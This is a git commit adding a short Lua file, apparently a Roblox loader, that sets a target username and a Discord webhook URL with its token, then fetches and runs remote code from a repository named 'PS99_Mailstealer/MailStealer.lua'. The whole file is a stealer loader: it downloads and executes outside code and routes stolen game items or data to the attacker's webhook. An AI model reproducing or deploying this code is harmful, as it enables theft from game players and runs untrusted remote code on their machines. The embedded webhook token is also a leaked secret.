a0235a1d1b69fb2eb11ac4836aeb37f5ad7d48b6
Space Duck <147960224+swiftcodingbird@users.noreply.github.com>
2024-04-30 16:42:08 -0700

    Add files via upload

---
+++ obf_026PMmQ3fVgV5BrDHYK0os2rWE2D23H7O5y4Ve1Ropwk7RXRM3qzdzfTqBT5b3W0.lua
@@ -0,0 +1,6 @@
+Username = "treevilevil"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1234747686394134591/OJmy2snoGiODLm9hCcXHj0Lfwry_rGjvm9Ccaf45z3V4JeWQ3VLjMSSFosXg2U4-cqA6" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+
